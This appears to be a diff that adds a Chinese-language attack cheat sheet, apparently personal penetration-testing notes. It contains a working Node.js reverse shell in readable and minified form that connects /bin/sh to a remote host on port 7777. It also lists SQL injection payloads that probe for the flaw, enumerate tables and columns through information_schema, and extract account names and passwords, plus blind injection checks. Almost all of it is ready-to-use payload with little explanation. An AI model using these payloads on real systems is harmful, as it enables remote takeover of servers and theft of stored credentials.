@@ -1,0 +1,62 @@
+一、hell 反弹
+
+// 非压缩版
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(7777, "192.168.199.243", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/;
+})();
+
+// 压缩版
+(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(7777,"10.211.55.3",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client)});return/a/})();
+
+
+
+
+
+二、sql注入
+
+// 测试是否有sql注入
+and 1=1
+and 1=2
+
+----  显错注入
+
+// 爆裤
+
+爆裤前需要知道 当前的谋生表有多少“列” column
+union select 1
+union select 1,2
+union select 1,2,3
+union select 1,2,3,4
+
+知道多少列 就可以爆数据库了
+union select 1,database(),user(),version()
+
+// 爆表
+union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 'school'),2,3
+
+// 爆表 的列字段
+union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = 'school' and table_name='user'),2,3
+
+// 读取账号密码
+union select 1,(select * from user where id = 0),2,3
+union select 1,(select group_concat(id,'-',admin,'-',password) from user),2,3;
+
+
+
+
+---- 盲打
+
+// 是否存在某个表
+and (select count(*) from user)
+
+// 是否存在某个列
+and (select count(admin) from user)
